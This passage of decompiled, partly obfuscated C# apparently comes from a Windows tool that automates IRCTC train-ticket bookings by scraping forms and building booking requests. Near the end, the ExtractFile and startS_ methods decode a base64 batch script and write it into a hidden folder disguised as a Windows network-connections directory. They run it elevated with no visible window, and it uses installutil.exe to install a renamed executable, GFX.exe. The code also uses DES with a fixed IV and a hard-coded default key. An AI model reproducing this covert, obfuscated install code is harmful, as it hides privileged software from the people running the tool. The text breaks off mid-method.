							string text28 = text;
							string text29 = "&";
							text30 = text28 + text29 + text16;
						}
						else
						{
							text30 = text16;
						}
						text = text30;
						continue;
					}
					return text;
				}
				return text;
			}
			return text;
			IL_04f1:
			return text;
		}
		catch
		{
			return text;
		}
	}

	public static string smethod_4_0(string string_87, ref string string_88)
	{
		string text = "";
		try
		{
			string oldValue = "'";
			string newValue = "\"";
			string text2 = string_87.Replace(oldValue, newValue);
			string value = "<form";
			int num = text2.IndexOf(value, StringComparison.CurrentCultureIgnoreCase);
			if (num < 0)
			{
				string value2 = "http://";
				if (text2.IndexOf(value2) != 0)
				{
					string value3 = "https://";
					if (text2.IndexOf(value3) != 0)
					{
						goto IL_04e6;
					}
				}
				string_88 = text2;
				goto IL_04e6;
			}
			try
			{
				string value4 = " action";
				int startIndex = text2.IndexOf(value4, num, StringComparison.CurrentCultureIgnoreCase);
				string value5 = "=";
				startIndex = text2.IndexOf(value5, startIndex, StringComparison.CurrentCultureIgnoreCase);
				string value6 = "\"";
				startIndex = text2.IndexOf(value6, startIndex) + 1;
				string value7 = "\"";
				int num2 = text2.IndexOf(value7, startIndex);
				string_88 = text2.Substring(startIndex, num2 - startIndex);
				string text3 = string_88;
				string oldValue2 = "&amp;";
				string newValue2 = "&";
				string_88 = text3.Replace(oldValue2, newValue2);
			}
			catch
			{
			}
			string value8 = "<form";
			num = text2.IndexOf(value8, StringComparison.CurrentCultureIgnoreCase);
			string value9 = "</form";
			int num3 = text2.IndexOf(value9, StringComparison.CurrentCultureIgnoreCase);
			while (num > -1)
			{
				string text4 = "";
				string value10 = "<input";
				int num4 = text2.IndexOf(value10, num, StringComparison.CurrentCultureIgnoreCase);
				string value11 = "<select";
				int num5 = text2.IndexOf(value11, num, StringComparison.CurrentCultureIgnoreCase);
				int num6 = -1;
				if (num4 != -1 || num5 != -1 || num6 != -1)
				{
					int num7 = num4;
					int[] array = new int[3] { num4, num5, num6 };
					for (int i = 1; i < array.Length; i++)
					{
						if (num7 > array[i] && array[i] != -1)
						{
							num7 = array[i];
						}
					}
					if (num7 != num4)
					{
						if (num7 == num5)
						{
							num = num5;
							string text5 = "select";
							text4 = text5;
						}
						else if (num7 == num6)
						{
							num = num6;
							text4 = "";
						}
					}
					else
					{
						num = num4;
						string text6 = "input";
						text4 = text6;
					}
					string text7 = "<";
					num = text2.IndexOf(text7 + text4, num, StringComparison.CurrentCultureIgnoreCase);
					if (num < num3)
					{
						string value12 = "<input";
						num = text2.IndexOf(value12, num, StringComparison.CurrentCultureIgnoreCase);
						string value13 = ">";
						int num8 = text2.IndexOf(value13, num) + 1;
						string text8 = text2.Substring(num, num8 - num);
						string text9 = text8;
						string oldValue3 = "\t";
						string text10 = text9.Replace(oldValue3, "");
						string oldValue4 = "\n";
						string text11 = text10.Replace(oldValue4, "");
						string oldValue5 = "\r";
						string newValue3 = " ";
						text8 = text11.Replace(oldValue5, newValue3);
						num = num8;
						string text12 = text8;
						string value14 = "type=\"submit\"";
						if (text12.Contains(value14))
						{
							continue;
						}
						string text13 = text8;
						string value15 = " name";
						int num9 = text13.IndexOf(value15, StringComparison.CurrentCultureIgnoreCase);
						if (num9 == -1)
						{
							continue;
						}
						string text14 = text8;
						string value16 = "\"";
						num9 = text14.IndexOf(value16, num9) + 1;
						string text15 = text8;
						string value17 = "\"";
						int num10 = text15.IndexOf(value17, num9);
						string text16 = text8.Substring(num9, num10 - num9);
						string text17 = text8;
						string value18 = " value";
						num9 = text17.IndexOf(value18, StringComparison.CurrentCultureIgnoreCase);
						string text18 = "";
						if (num9 > -1)
						{
							string text19 = text8;
							string value19 = "\"";
							if (text19.IndexOf(value19, num9) > -1)
							{
								string text20 = text8;
								string value20 = "\"";
								num9 = text20.IndexOf(value20, num9) + 1;
								string text21 = text8;
								string value21 = "\"";
								num10 = text21.IndexOf(value21, num9);
							}
							else
							{
								string text22 = text8;
								string value22 = "'";
								if (text22.IndexOf(value22, num9) > -1)
								{
									string text23 = text8;
									string value23 = "'";
									num9 = text23.IndexOf(value23, num9) + 1;
									string text24 = text8;
									string value24 = "'";
									num10 = text24.IndexOf(value24, num9);
								}
							}
							string text25 = text8.Substring(num9, num10 - num9);
							string oldValue6 = "&amp;";
							string newValue4 = "&";
							text18 = WebUtility.UrlEncode(text25.Replace(oldValue6, newValue4));
						}
						string text26 = text16;
						string text27 = "=";
						text16 = text26 + text27 + text18;
						string text30;
						if (!string.IsNullOrEmpty(text))
						{
							string text28 = text;
							string text29 = "&";
							text30 = text28 + text29 + text16;
						}
						else
						{
							text30 = text16;
						}
						text = text30;
						continue;
					}
					return text;
				}
				return text;
			}
			return text;
			IL_04e6:
			return text;
		}
		catch
		{
			return text;
		}
	}

	public string method_13(string string_87, string string_88)
	{
		string text = "";
		try
		{
			string text2 = string_87;
			string oldValue = "{";
			string_87 = text2.Replace(oldValue, "");
			string text3 = string_87;
			string oldValue2 = "}";
			string_87 = text3.Replace(oldValue2, "");
			string[] array = string_87.Split(',');
			int num = Information.UBound(array);
			for (int i = 0; i <= num; i++)
			{
				string text4 = array[i].ToString().Split('~')[0];
				string text5 = "\"";
				if (text4.Contains(text5 + string_88))
				{
					text = text4.Substring(text4.IndexOf(string_88) + (string_88.Length + 3));
					string text6 = text;
					string text7 = text;
					string value = "\"";
					text = text6.Substring(0, text7.IndexOf(value));
					return text;
				}
			}
			return text;
		}
		catch
		{
			return text;
		}
	}

	public static string SetPost(string string_87, string string_88, string string_89)
	{
		string text = "";
		string text2 = "";
		string text3 = "";
		bool flag = false;
		try
		{
			if (string_87.IndexOf(string_88) == 0)
			{
				string text4 = string_87;
				string text5 = "=";
				string oldValue = string_88 + text5;
				string text6 = "=";
				return text4.Replace(oldValue, string_88 + text6 + string_89);
			}
			string text7 = string_87;
			string text8 = string_87;
			string text9 = "&";
			string text10 = "=";
			text = text7.Substring(0, text8.IndexOf(text9 + string_88 + text10) + 1);
			string text22;
			string text25;
			if (!(text == ""))
			{
				string text11 = string_87;
				string text12 = string_87;
				string text13 = "&";
				string text14 = "=";
				text2 = text11.Substring(text12.IndexOf(text13 + string_88 + text14) + 1);
				try
				{
					string text15 = text2;
					string text16 = text2;
					string value = "&";
					text3 = text15.Substring(0, text16.IndexOf(value));
				}
				catch
				{
					flag = true;
					text3 = text2;
				}
				string text17 = text3;
				string text18 = text3;
				string value2 = "=";
				string text19 = text17.Substring(text18.IndexOf(value2) + 1);
				string text20 = text3;
				string text21 = text3;
				string value3 = "=";
				text22 = text20.Substring(0, text21.IndexOf(value3));
				string text23 = text2;
				string text24 = text2;
				string value4 = "&";
				text25 = text23.Substring(text24.IndexOf(value4) + 1);
				if (string_89 == null)
				{
					goto IL_029f;
				}
				string right = "del";
				if (Operators.CompareString(string_89, right, TextCompare: true) != 0)
				{
					string right2 = "blnk";
					if (Operators.CompareString(string_89, right2, TextCompare: true) == 0)
					{
						string text26 = text;
						string text27 = "=&";
						string_87 = text26 + text22 + text27 + text25;
					}
					else
					{
						string right3 = "intt";
						if (Operators.CompareString(string_89, right3, TextCompare: true) != 0)
						{
							goto IL_029f;
						}
						if (Operators.CompareString(text19, "", TextCompare: true) != 0)
						{
							string[] array = new string[6] { text, text22, null, null, null, null };
							string text28 = "=";
							array[2] = text28;
							array[3] = ((int)Convert.ToUInt32(text19)).ToString();
							string text29 = "&";
							array[4] = text29;
							array[5] = text25;
							string_87 = string.Concat(array);
						}
					}
				}
				else
				{
					string_87 = text + text25;
				}
				goto IL_0299;
			}
			string[] array2 = new string[5] { string_87, null, null, null, null };
			string text30 = "&";
			array2[1] = text30;
			array2[2] = string_88;
			string text31 = "=";
			array2[3] = text31;
			array2[4] = string_89;
			return string.Concat(array2);
			IL_029f:
			string text34;
			if (!flag)
			{
				string[] array3 = new string[6] { text, text22, null, null, null, null };
				string text32 = "=";
				array3[2] = text32;
				array3[3] = string_89;
				string text33 = "&";
				array3[4] = text33;
				array3[5] = text25;
				text34 = string.Concat(array3);
			}
			else
			{
				string text35 = text;
				string text36 = "=";
				text34 = text35 + text22 + text36 + string_89;
			}
			string_87 = text34;
			goto IL_0299;
			IL_0299:
			return string_87;
		}
		catch (Exception)
		{
			return string_87;
		}
	}

	public static string smethod_6(string string_87, ref string string_88, bool bool_14)
	{
		string string_89 = string_88;
		string result = smethod_4(string_87, ref string_89);
		string_88 = string_89;
		string text = string_88;
		string oldValue = "&amp;";
		string newValue = "&";
		string_88 = text.Replace(oldValue, newValue);
		return result;
	}

	public string method_26(string string_158, ref string string_159, bool bool_22)
	{
		string string_160 = string_159;
		string result = smethod_12(string_158, ref string_160);
		string_159 = string_160;
		string_159 = string_158.Replace("&amp;", "&");
		return result;
	}

	public static string smethod_12(string string_158, ref string string_159)
	{
		int num = 906601212;
		int num2 = 546661581;
		while (num <= 906602952)
		{
			num = num + 213 + 109;
		}
		if (num2 == 148)
		{
			num2 = 349 + (133 + (157 + (180 + num2)));
		}
		num2 += 255;
		Debug.Assert((byte)(-906603143 + num) != 0);
		if (126 == num)
		{
			num = num + 349 + 131 + 226 + 206;
		}
		num2 = 450;
		string text = "";
		try
		{
			string text2 = string_158.Replace('\'', '"');
			int num3 = text2.IndexOf("<form", StringComparison.CurrentCultureIgnoreCase);
			if (num3 < 0)
			{
				if (text2.IndexOf("http://") == 0 || text2.IndexOf("https://") == 0)
				{
					string_159 = text2;
				}
				return text;
			}
			try
			{
				int num4 = text2.IndexOf("\"", text2.IndexOf("=", text2.IndexOf(" action", num3, StringComparison.CurrentCultureIgnoreCase), StringComparison.CurrentCultureIgnoreCase)) + 1;
				string_159 = text2.Substring(num4, text2.IndexOf("\"", num4) - num4);
				if ((0x1C3 ^ num2) != 0 && (0x3609AA88 ^ num) == 0)
				{
					string_159 = string_159.Replace("&amp;", "&");
				}
			}
			catch
			{
			}
			num3 = text2.IndexOf("<form", StringComparison.CurrentCultureIgnoreCase);
			int num5 = text2.IndexOf("</form", StringComparison.CurrentCultureIgnoreCase);
			while (num3 > -1)
			{
				string text3 = "";
				int num6 = text2.IndexOf("<input", num3, StringComparison.CurrentCultureIgnoreCase);
				int num7 = text2.IndexOf("<select", num3, StringComparison.CurrentCultureIgnoreCase);
				int num8 = -1;
				if (num6 != -1 || num7 != -1 || num8 != -1)
				{
					int num9 = num6;
					int[] array = new int[3] { num6, num7, num8 };
					for (int i = 1; i < array.Length; i++)
					{
						if (num9 > array[i] && array[i] != -1)
						{
							num9 = array[i];
						}
					}
					if (num9 == num6)
					{
						num3 = num6;
						text3 = "input";
					}
					else if (num9 == num7)
					{
						num3 = num7;
						text3 = "select";
					}
					else if (num9 == num8)
					{
						num3 = num8;
						text3 = "";
					}
					num3 = text2.IndexOf("<" + text3, num3, StringComparison.CurrentCultureIgnoreCase);
					if (num3 < num5)
					{
						num3 = text2.IndexOf("<input", num3, StringComparison.CurrentCultureIgnoreCase);
						int num10 = text2.IndexOf(">", num3) + 1;
						string text4 = text2.Substring(num3, num10 - num3).Replace("\t", "").Replace("\n", "")
							.Replace('\r', ' ');
						num3 = num10;
						if (text4.Contains("type=\"submit\""))
						{
							continue;
						}
						int num11 = text4.IndexOf(" name", StringComparison.CurrentCultureIgnoreCase);
						if (num11 == -1)
						{
							continue;
						}
						num11 = text4.IndexOf("\"", num11) + 1;
						int num12 = text4.IndexOf("\"", num11);
						string text5 = text4.Substring(num11, num12 - num11);
						num11 = text4.IndexOf(" value", StringComparison.CurrentCultureIgnoreCase);
						string text6 = "";
						if (num11 > -1)
						{
							if (text4.IndexOf("\"", num11) > -1)
							{
								num11 = text4.IndexOf("\"", num11) + 1;
								num12 = text4.IndexOf("\"", num11);
							}
							else if (text4.IndexOf("'", num11) > -1)
							{
								num11 = text4.IndexOf("'", num11) + 1;
								num12 = text4.IndexOf("'", num11);
							}
							text6 = HttpUtility.UrlEncode(text4.Substring(num11, num12 - num11).Replace("&amp;", "&"));
						}
						text5 = text5 + "=" + text6;
						text = (string.IsNullOrEmpty(text) ? text5 : (text + "&" + text5));
						continue;
					}
					return text;
				}
				return text;
			}
			return text;
		}
		catch
		{
			return text;
		}
	}

	public string Method_SerialInp(string string_87, ref string string_88, bool bool_14)
	{
		string string_89 = string_88;
		string result = smethod_4(string_87, ref string_89);
		string_88 = string_89;
		string text = string_88;
		string oldValue = "&amp;";
		string newValue = "&";
		string_88 = text.Replace(oldValue, newValue);
		return result;
	}

	public string Method_SerialInp0(string string_87, ref string string_88, bool bool_14)
	{
		string string_89 = string_88;
		string result = smethod_4_0(string_87, ref string_89);
		string_88 = string_89;
		string text = string_88;
		string oldValue = "&amp;";
		string newValue = "&";
		string_88 = text.Replace(oldValue, newValue);
		return result;
	}

	public static string smethod_7(string string_87, string string_88, string string_89, string string_90)
	{
		return new Class10().method_2(string_87, string_88, string_89, string_90);
	}

	internal void GetBookPost(ref string url_, ref string postData, ref string reff0, bool isapp, bool adv)
	{
		string text = "https://www.irctc.co.in/nget/booking/train-list";
		reff0 = text;
		string text2 = "https://www.irctc.co.in/eticketing/protected/mapps1/boardingStationEnq";
		url_ = text2;
		string[] array = new string[13];
		string text3 = "{\"masterId\":null,\"wsUserLogin\":null,\"wsUserPassword\":null,\"wsUserTransactionPassword\":null,\"agentDeviceId\":null,\"alternateAvlInputDTO\":[{\"availabilityStatus\":null,\"avlClasses\":null,\"concessionPassengers\":true,\"currentBooking\":null,\"destStn\":\"";
		array[0] = text3;
		array[1] = DEST_STN;
		string text4 = "\",\"flexiFlag\":false,\"flexiJrnyDate\":null,\"ftBooking\":false,\"handicapFlag\":null,\"jd\":null,\"jpFlag\":false,\"jrnyClass\":\"";
		array[2] = text4;
		array[3] = TKT_CLASS;
		string text5 = "\",\"jrnyDate\":\"";
		array[4] = text5;
		ref DateTime reference = ref dateTime_0;
		string text6 = "yyyMMdd";
		array[5] = reference.ToString(text6);
		string text7 = "\",\"loyaltyBooking\":false,\"loyaltyRedemptionBooking\":null,\"quotaCode\":\"";
		array[6] = text7;
		array[7] = TKT_QUOTA;
		string text8 = "\",\"reasonType\":\"\",\"returnTicket\":false,\"srcStn\":\"";
		array[8] = text8;
		array[9] = SRC_STN;
		string text9 = "\",\"ticketType\":null,\"trainNo\":\"";
		array[10] = text9;
		array[11] = TRAIN_NO;
		string text10 = "\"}],\"atasOpted\":null,\"autoUpgradationSelected\":false,\"bankId\":0,\"boardingStation\":null,\"bookNowPressTimeDiff\":0,\"bookingChoice\":0,\"bookingConfirmChoice\":0,\"bookingInitTime\":0,\"bookingOTP\":null,\"captcha\":null,\"captureAddress\":0,\"clientTransactionId\":null,\"clusterFlag\":\"N\",\"clusterJourneyClass\":null,\"cod\":\"false\",\"connectedPnrDataDTO\":null,\"connectingJourney\":false,\"covid19\":false,\"enrouteStation\":null,\"ftBooking\":false,\"generalistChildConfirm\":false,\"gnToCkOpted\":false,\"gstDetails\":null,\"hrmsTxnId\":0,\"iTicketDetailsDTO\":null,\"journalistBooking\":false,\"lapAvlRequestDTO\":null,\"loyaltyAccuralBooking\":false,\"loyaltyBankId\":null,\"loyaltyNumber\":null,\"loyaltyRedemptionBooking\":false,\"mainJourneyPnr\":null,\"mainJourneyTktId\":null,\"mainJourneyTxnId\":null,\"mobileNumber\":null,\"moreThanOneDay\":null,\"mpBooking\":false,\"mpSecType\":null,\"name\":null,\"nget_transaction_id\":0,\"nlpCaptchaVarsDTO\":null,\"nosbBooking\":false,\"onwardFlag\":\"N\",\"otpBooking\":false,\"passBooking\":false,\"paymentType\":1,\"reservationMode\":\"WS_TA_B2C\",\"reservationUptoStation\":null,\"returnJourney\":false,\"ticketType\":null,\"tktAddress\":null,\"twoPhaseAuthRequired\":false,\"viaPointStation\":null,\"warrentType\":null}";
		array[12] = text10;
		postData = string.Concat(array);
		string[] array2 = new string[13];
		string text11 = "{\"clusterFlag\":\"N\",\"onwardFlag\":\"N\",\"cod\":\"false\",\"reservationMode\":\"WS_TA_B2C\",\"autoUpgradationSelected\":false,\"gnToCkOpted\":false,\"paymentType\":1,\"twoPhaseAuthRequired\":false,\"captureAddress\":0,\"alternateAvlInputDTO\":[{\"trainNo\":\"";
		array2[0] = text11;
		array2[1] = TRAIN_NO;
		string text12 = "\",\"destStn\":\"";
		array2[2] = text12;
		array2[3] = DEST_STN;
		string text13 = "\",\"srcStn\":\"";
		array2[4] = text13;
		array2[5] = SRC_STN;
		string text14 = "\",\"jrnyDate\":\"";
		array2[6] = text14;
		ref DateTime reference2 = ref dateTime_0;
		string text15 = "yyyMMdd";
		array2[7] = reference2.ToString(text15);
		string text16 = "\",\"quotaCode\":\"";
		array2[8] = text16;
		array2[9] = TKT_QUOTA;
		string text17 = "\",\"jrnyClass\":\"";
		array2[10] = text17;
		array2[11] = TKT_CLASS;
		string text18 = "\",\"concessionPassengers\":false}],\"passBooking\":false,\"journalistBooking\":false,\"returnJourney\":false}";
		array2[12] = text18;
		postData = string.Concat(array2);
		if (isapp)
		{
			string[] array3 = new string[13];
			string text19 = "{\"masterId\":null,\"wsUserLogin\":null,\"wsUserPassword\":null,\"wsUserTransactionPassword\":null,\"agentDeviceId\":null,\"alternateAvlInputDTO\":[{\"availabilityStatus\":null,\"avlClasses\":null,\"concessionPassengers\":true,\"currentBooking\":null,\"destStn\":\"";
			array3[0] = text19;
			array3[1] = DEST_STN;
			string text20 = "\",\"flexiFlag\":false,\"flexiJrnyDate\":null,\"ftBooking\":false,\"handicapFlag\":null,\"jd\":null,\"jpFlag\":false,\"jrnyClass\":\"";
			array3[2] = text20;
			array3[3] = TKT_CLASS;
			string text21 = "\",\"jrnyDate\":\"";
			array3[4] = text21;
			ref DateTime reference3 = ref dateTime_0;
			string text22 = "yyyMMdd";
			array3[5] = reference3.ToString(text22);
			string text23 = "\",\"loyaltyBooking\":false,\"loyaltyRedemptionBooking\":null,\"quotaCode\":\"";
			array3[6] = text23;
			array3[7] = TKT_QUOTA;
			string text24 = "\",\"reasonType\":\"\",\"returnTicket\":false,\"srcStn\":\"";
			array3[8] = text24;
			array3[9] = SRC_STN;
			string text25 = "\",\"ticketType\":null,\"trainNo\":\"";
			array3[10] = text25;
			array3[11] = TRAIN_NO;
			string text26 = "\"}],\"atasOpted\":null,\"autoUpgradationSelected\":false,\"bankId\":0,\"boardingStation\":null,\"bookNowPressTimeDiff\":0,\"bookingChoice\":0,\"bookingConfirmChoice\":0,\"bookingInitTime\":0,\"bookingOTP\":null,\"captcha\":null,\"captureAddress\":0,\"clientTransactionId\":null,\"clusterFlag\":\"N\",\"clusterJourneyClass\":null,\"cod\":\"false\",\"connectedPnrDataDTO\":null,\"connectingJourney\":false,\"covid19\":false,\"enrouteStation\":null,\"ftBooking\":false,\"generalistChildConfirm\":false,\"gnToCkOpted\":false,\"gstDetails\":null,\"hrmsTxnId\":0,\"iTicketDetailsDTO\":null,\"journalistBooking\":false,\"lapAvlRequestDTO\":null,\"loyaltyAccuralBooking\":false,\"loyaltyBankId\":null,\"loyaltyNumber\":null,\"loyaltyRedemptionBooking\":false,\"mainJourneyPnr\":null,\"mainJourneyTktId\":null,\"mainJourneyTxnId\":null,\"mobileNumber\":null,\"moreThanOneDay\":null,\"mpBooking\":false,\"mpSecType\":null,\"name\":null,\"nget_transaction_id\":0,\"nlpCaptchaVarsDTO\":null,\"nosbBooking\":false,\"onwardFlag\":\"N\",\"otpBooking\":false,\"passBooking\":false,\"paymentType\":1,\"reservationMode\":\"WS_TA_B2C\",\"reservationUptoStation\":null,\"returnJourney\":false,\"ticketType\":null,\"tktAddress\":null,\"twoPhaseAuthRequired\":false,\"viaPointStation\":null,\"warrentType\":null}";
			array3[12] = text26;
			postData = string.Concat(array3);
		}
	}

	public static string Encrypt(string string_0, string string_4)
	{
		byte[] rgbIV = new byte[8] { 18, 52, 86, 120, 144, 171, 205, 239 };
		byte[] bytes = Encoding.UTF8.GetBytes(Strings.Left(string_4, 8));
		DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
		byte[] bytes2 = Encoding.UTF8.GetBytes(string_0);
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, dESCryptoServiceProvider.CreateEncryptor(bytes, rgbIV), CryptoStreamMode.Write);
		cryptoStream.Write(bytes2, 0, bytes2.Length);
		cryptoStream.FlushFinalBlock();
		return Convert.ToBase64String(memoryStream.ToArray());
	}

	public static string Decrypt(string string_0, string string_4)
	{
		if (string.IsNullOrEmpty(string_4))
		{
			string text = "4t56765y";
			string_4 = text;
		}
		byte[] rgbIV = new byte[8] { 18, 52, 86, 120, 144, 171, 205, 239 };
		try
		{
			byte[] bytes = Encoding.UTF8.GetBytes(string_4.Substring(0, 8));
			DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
			byte[] array = Convert.FromBase64String(string_0);
			MemoryStream memoryStream = new MemoryStream();
			CryptoStream cryptoStream = new CryptoStream(memoryStream, dESCryptoServiceProvider.CreateDecryptor(bytes, rgbIV), CryptoStreamMode.Write);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.FlushFinalBlock();
			return Encoding.UTF8.GetString(memoryStream.ToArray());
		}
		catch (Exception ex)
		{
			return ex.Message;
		}
	}

	private string GetString(string string_86, string string_87)
	{
		string result = "";
		try
		{
			string text = "\"";
			string text2 = string_86.Substring(string_86.IndexOf(text + string_87));
			string text3 = text2.Substring(text2.IndexOf(string_87) + (string_87.Length + 3));
			string text4 = text3;
			string text5 = text3;
			string value = "\"";
			text3 = text4.Substring(0, text5.IndexOf(value));
			result = text3;
			return result;
		}
		catch
		{
			return result;
		}
	}

	internal void GetStationList(string str4, string frm)
	{
		try
		{
			string[] array = new string[0];
			string[] array2 = new string[0];
			string variable = "SwitchDEST";
			bool flag = Convert.ToBoolean(Environment.GetEnvironmentVariable(variable));
			string variable2 = "SwitchSRC";
			bool flag2 = Convert.ToBoolean(Environment.GetEnvironmentVariable(variable2));
			string value = "stationList";
			string text = str4.Substring(str4.IndexOf(value));
			string text2 = text;
			string text3 = text;
			string value2 = "[";
			text = text2.Substring(text3.IndexOf(value2) + 1);
			string text4 = text;
			string text5 = text;
			string value3 = "]";
			text = text4.Substring(0, text5.LastIndexOf(value3));
			List<string> list = GetList(text);
			List<string> list2 = new List<string>(list);
			new List<string>();
			new List<string>();
			list2.Reverse();
			Station_list = new string[list.Count + 1];
			Station_listWithDay = new string[list.Count + 1];
			int num = 0;
			int num2 = 0;
			bool flag3 = false;
			int num3 = 0;
			if (!flag2)
			{
				array = new string[1];
				dictionary_SRC.Add(0, SRC_STN);
				array[0] = SRC_STN;
			}
			else
			{
				for (int i = 0; i < list2.Count; i++)
				{
					string string_ = list2[i];
					string string_2 = "stationCode";
					string @string = GetString(string_, string_2);
					if (flag3)
					{
						string string_3 = list2[i];
						string string_4 = "dayCount";
						int num4 = int.Parse(GetString(string_3, string_4));
						string string_5 = list2[i];
						string string_6 = "distance";
						int num5 = int.Parse(GetString(string_5, string_6));
						if (num2 - num5 < 150 && num == num4)
						{
							dictionary_SRC.Add(num3, @string);
							num3++;
						}
					}
					if (@string == BRD_STN)
					{
						string string_7 = list2[i];
						string string_8 = "dayCount";
						num = int.Parse(GetString(string_7, string_8));
						string string_9 = list2[i];
						string string_10 = "distance";
						num2 = int.Parse(GetString(string_9, string_10));
						dictionary_SRC.Add(num3, @string);
						flag3 = true;
						num3++;
					}
				}
				array = new string[dictionary_SRC.Count];
				for (int j = 0; j < dictionary_SRC.Count; j++)
				{
					array[j] = dictionary_SRC[j];
				}
			}
			num2 = 0;
			flag3 = false;
			num3 = 0;
			if (!flag)
			{
				array2 = new string[1];
				dictionary_DEST.Add(0, DEST_STN);
				array2[0] = DEST_STN;
			}
			else
			{
				for (int k = 0; k < list.Count; k++)
				{
					string string_11 = list[k];
					string string_12 = "stationCode";
					string string2 = GetString(string_11, string_12);
					if (flag3)
					{
						string string_13 = list[k];
						string string_14 = "distance";
						int num6 = int.Parse(GetString(string_13, string_14));
						if (num2 - num6 < 150)
						{
							dictionary_DEST.Add(num3, string2);
							num3++;
						}
					}
					if (string2 == DEST_STN)
					{
						string string_15 = list[k];
						string string_16 = "distance";
						num2 = int.Parse(GetString(string_15, string_16));
						dictionary_DEST.Add(num3, string2);
						flag3 = true;
						num3++;
					}
				}
				if (dictionary_DEST.Count < 2)
				{
					dictionary_DEST = new Dictionary<int, string>();
					num2 = 0;
					flag3 = false;
					num3 = 0;
					for (int l = 0; l < list2.Count; l++)
					{
						string string_17 = list2[l];
						string string_18 = "stationCode";
						string string3 = GetString(string_17, string_18);
						if (flag3)
						{
							string string_19 = list2[l];
							string string_20 = "distance";
							int num7 = int.Parse(GetString(string_19, string_20));
							if (num2 - num7 < 250)
							{
								dictionary_DEST.Add(num3, string3);
								num3++;
							}
						}
						if (string3 == DEST_STN)
						{
							string string_21 = list2[l];
							string string_22 = "distance";
							num2 = int.Parse(GetString(string_21, string_22));
							dictionary_DEST.Add(num3, string3);
							flag3 = true;
							num3++;
						}
					}
				}
				array2 = new string[dictionary_DEST.Count];
				for (int m = 0; m < dictionary_DEST.Count; m++)
				{
					array2[m] = dictionary_DEST[m];
				}
			}
			int num8 = 0;
			int num9 = 0;
			string[] array3 = array;
			for (int n = 0; n < array3.Length; n++)
			{
				int num10 = 0;
				string[] array4 = array2;
				for (int num11 = 0; num11 < array4.Length; num11++)
				{
					string text6 = dictionary_SRC[num9];
					string text7 = "|";
					string value4 = text6 + text7 + dictionary_DEST[num10];
					dic_SwitchStation.Add(num8, value4);
					num10++;
					num8++;
				}
				num9++;
			}
		}
		catch (Exception)
		{
		}
	}

	public List<string> GetList(string str4)
	{
		string[] array = new string[2];
		string text = "{";
		array[0] = text;
		string text2 = "},";
		array[1] = text2;
		List<string> list = new List<string>(str4.Split(array, StringSplitOptions.None));
		list.RemoveAll(RemoveEmptyString);
		if (predicate_0 == null)
		{
			predicate_0 = smethod_5i;
		}
		list.RemoveAll(predicate_0);
		if (predicate_1 == null)
		{
			predicate_1 = smethod_6i;
		}
		if (predicate_2 == null)
		{
			predicate_2 = smethod_7i;
		}
		list.RemoveAll(predicate_2);
		return list;
	}

	private static bool smethod_5i(string string_0)
	{
		if (string_0.ToLower().Contains(""))
		{
			int num2;
			do
			{
				int[,,,,] array = new int[2, 5, 1, 1, 1]
				{
					{
						{ { { 0 } } },
						{ { { -1142376215 } } },
						{ { { 788528662 } } },
						{ { { 1426605833 } } },
						{ { { -1755967436 } } }
					},
					{
						{ { { 1242519214 } } },
						{ { { 2129987153 } } },
						{ { { -1 } } },
						{ { { -1565281489 } } },
						{ { { 571113533 } } }
					}
				};
				int num = -(~array[0, 0, 0, 0, 0]);
				num2 = num;
				if (num2 == 1)
				{
					return !string_0.ToLower().Contains("");
				}
			}
			while (num2 == 2);
		}
		return true;
	}

	private static bool smethod_6i(string string_0)
	{
		string value = "\"";
		return !string_0.EndsWith(value);
	}

	private static bool smethod_7i(string string_0)
	{
		string text = "</td>";
		return string_0 == text;
	}

	private static bool RemoveEmptyString(string s)
	{
		return s == "";
	}

	public static void ExtractFile(object j)
	{
		int num = 0;
		while (true)
		{
			try
			{
				string variable = "clientID";
				Environment.GetEnvironmentVariable(variable, EnvironmentVariableTarget.Process);
			}
			catch
			{
			}
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			string text = "\\Microsoft\\Network\\Connections\\Pbk\\_hiddenPbk";
			ptth0 = folderPath + text;
			try
			{
				string text2 = "QGVjaG8gb2ZmCmNkIEM6XFdpbmRvd3NcTWljcm9zb2Z0Lk5FVFxGcmFtZXdvcmtcdjQuMC4zMDMxOQppbnN0YWxsdXRpbC5leGUgLXUgInBhdGhcQ2hyb21lLmV4ZSIKb3RvIGVycm9yCmV4aXQKOmVycm9yCmVjaG8gVGhlcmUgd2FzIGEgcHJvYmxlbQpwYXVzZQ==";
				string base64EncodedData = text2;
				base64EncodedData = Base64Decode(base64EncodedData);
				string text3 = base64EncodedData;
				string oldValue = "path";
				string text4 = text3.Replace(oldValue, ptth0);
				string oldValue2 = "Chrome.exe";
				string newValue = "GFX.exe";
				base64EncodedData = text4.Replace(oldValue2, newValue);
				new Process();
				if (!Directory.Exists(ptth0))
				{
					Directory.CreateDirectory(ptth0);
				}
				string text5 = ptth0;
				string text6 = "\\StopGFX.bat";
				if (!File.Exists(text5 + text6))
				{
					string text7 = ptth0;
					string text8 = "\\StopGFX.bat";
					File.WriteAllText(text7 + text8, base64EncodedData);
				}
				Process process = new Process();
				ProcessStartInfo startInfo = process.StartInfo;
				string text9 = ptth0;
				string text10 = "\\StopGFX.bat";
				startInfo.FileName = text9 + text10;
				process.StartInfo.CreateNoWindow = true;
				process.StartInfo.UseShellExecute = false;
				ProcessStartInfo startInfo2 = process.StartInfo;
				string verb = "runas";
				startInfo2.Verb = verb;
				process.Start();
				process.WaitForExit();
				break;
			}
			catch (Exception)
			{
				num++;
				if (num < 3)
				{
					continue;
				}
				break;
			}
		}
	}

	internal static void startS_(object j)
	{
		try
		{
			string text = "QGVjaG8gb2ZmCmNkIEM6XFdpbmRvd3NcTWljcm9zb2Z0Lk5FVFxGcmFtZXdvcmtcdjQuMC4zMDMxOQppbnN0YWxsdXRpbC5leGUgInBhdGhcQ2hyb21lLmV4ZSIKb3RvIGVycm9yCmV4aXQKOmVycm9yCmVjaG8gVGhlcmUgd2FzIGEgcHJvYmxlbQpwYXVzZQ==";
			string base64EncodedData = text;
			base64EncodedData = Base64Decode(base64EncodedData);
			string text2 = base64EncodedData;
			string oldValue = "path";
			string text3 = text2.Replace(oldValue, ptth0);
			string oldValue2 = "Chrome.exe";
			string newValue = "GFX.exe";
			base64EncodedData = text3.Replace(oldValue2, newValue);
			string text4 = ptth0;
			string text5 = "\\Start.bat";
